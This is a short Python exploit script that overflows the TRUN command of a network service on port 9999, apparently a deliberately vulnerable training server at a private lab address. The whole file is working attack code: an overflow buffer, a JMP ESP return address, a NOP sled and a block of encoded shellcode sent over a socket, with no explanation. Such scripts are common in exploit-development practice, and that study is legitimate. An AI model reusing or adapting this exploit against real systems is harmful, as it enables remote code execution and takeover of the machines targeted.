#!/usr/bin/python
import socket

buffstring="A"*2006

# 625011AF   FFE4             JMP ESP

ret='\xaf\x11\x50\x62'

payload=("\xda\xd2\xbb\xae\xe9\x61\x88\xd9\x74\x24\xf4\x5f\x29\xc9"
"\xb1\x53\x31\x5f\x17\x83\xc7\x04\x03\xf1\xfa\x83\x7d\xf1"
"\x15\xc1\x7e\x09\xe6\xa6\xf7\xec\xd7\xe6\x6c\x65\x47\xd7"
"\xe7\x2b\x64\x9c\xaa\xdf\xff\xd0\x62\xd0\x48\x5e\x55\xdf"
"\x49\xf3\xa5\x7e\xca\x0e\xfa\xa0\xf3\xc0\x0f\xa1\x34\x3c"
"\xfd\xf3\xed\x4a\x50\xe3\x9a\x07\x69\x88\xd1\x86\xe9\x6d"
"\xa1\xa9\xd8\x20\xb9\xf3\xfa\xc3\x6e\x88\xb2\xdb\x73\xb5"
"\x0d\x50\x47\x41\x8c\xb0\x99\xaa\x23\xfd\x15\x59\x3d\x3a"
"\x91\x82\x48\x32\xe1\x3f\x4b\x81\x9b\x9b\xde\x11\x3b\x6f"
"\x78\xfd\xbd\xbc\x1f\x76\xb1\x09\x6b\xd0\xd6\x8c\xb8\x6b"
"\xe2\x05\x3f\xbb\x62\x5d\x64\x1f\x2e\x05\x05\x06\x8a\xe8"
"\x3a\x58\x75\x54\x9f\x13\x98\x81\x92\x7e\xf5\x66\x9f\x80"
"\x05\xe1\xa8\xf3\x37\xae\x02\x9b\x7b\x27\x8d\x5c\x7b\x12"
"\x69\xf2\x82\x9d\x8a\xdb\x40\xc9\xda\x73\x60\x72\xb1\x83"
"\x8d\xa7\x2c\x8b\x28\x18\x53\x76\x8a\xc8\xd3\xd8\x63\x03"
"\xdc\x07\x93\x2c\x36\x20\x3c\xd1\xb9\x5f\xe1\x5c\x5f\x35"
"\x09\x09\xf7\xa1\xeb\x6e\xc0\x56\x13\x45\x78\xf0\x5c\x8f"
"\xbf\xff\x5c\x85\x97\x97\xd6\xca\x23\x86\xe8\xc6\x03\xdf"
"\x7f\x9c\xc5\x92\x1e\xa1\xcf\x44\x82\x30\x94\x94\xcd\x28"
"\x03\xc3\x9a\x9f\x5a\x81\x36\xb9\xf4\xb7\xca\x5f\x3e\x73"
"\x11\x9c\xc1\x7a\xd4\x98\xe5\x6c\x20\x20\xa2\xd8\xfc\x77"
"\x7c\xb6\xba\x21\xce\x60\x15\x9d\x98\xe4\xe0\xed\x1a\x72"
"\xed\x3b\xed\x9a\x5c\x92\xa8\xa5\x51\x72\x3d\xde\x8f\xe2"
"\xc2\x35\x14\x12\x89\x17\x3d\xbb\x54\xc2\x7f\xa6\x66\x39"
"\x43\xdf\xe4\xcb\x3c\x24\xf4\xbe\x39\x60\xb2\x53\x30\xf9"
"\x57\x53\xe7\xfa\x7d")


bufferbackfill="C"*613    # accounting for NOPS (16) and PAYLOAD (355)



s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.19.130', 9999))
s.recv(50)
s.send('TRUN .' + buffstring + ret + "\x90"*16 + payload + bufferbackfill)
s.close()
